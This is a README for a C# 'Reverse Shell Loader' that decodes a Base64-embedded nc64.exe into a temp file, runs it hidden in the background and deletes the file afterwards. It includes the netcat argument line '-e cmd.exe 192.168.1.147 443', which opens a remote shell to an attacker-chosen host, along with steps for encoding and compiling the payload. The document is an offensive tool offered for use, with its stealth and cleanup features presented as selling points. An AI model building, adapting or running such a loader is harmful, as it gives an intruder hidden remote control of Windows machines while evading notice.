# Reverse Shell Loader

This project provides a loader to execute a reverse shell using a Base64-encoded `nc64.exe` (Netcat for Windows). The loader decodes the Base64, writes it to a temporary file, and executes it in the background to establish a reverse shell connection to a specified IP address and port.

## Features

- **Base64 Decoding**: The loader decodes the Base64-encoded `nc64.exe` and saves it as an executable file in the temporary directory.
- **Hidden Execution**: The `nc64.exe` is executed with the specified arguments, and the terminal remains hidden (no new terminal window is opened).
- **No Blocking**: The loader does not wait for the `nc64.exe` process to finish, allowing the reverse shell to run in the background.
- **Temporary File Cleanup**: The temporary file created for the shellcode is deleted after the reverse shell is executed.

## Usage

1. **Modify the IP Address**: Open the `ReverseShellLoader.cs` file and change the IP address and port in the following line:

    ```csharp
    Arguments = "-e cmd.exe 192.168.1.147 443", // Netcat IP and port
    ```

    Replace `192.168.1.147` with your desired IP address and `443` with the port number you want to use for the reverse shell.

2. **Replace the Base64 string**: Replace the `<YOUR_BASE64_OF_NC64.EXE>` in the code with the actual Base64-encoded string of the `nc64.exe` file.

    You can generate the Base64 string of `nc64.exe` using the following command:

    ```bash
    cat nc64.exe | base64 -w 0
    ```

3. **Compile the Code**: Compile the C# code using a C# compiler or Visual Studio.

4. **Run the Loader**: Execute the compiled binary, and the reverse shell will connect to the specified IP address and port.
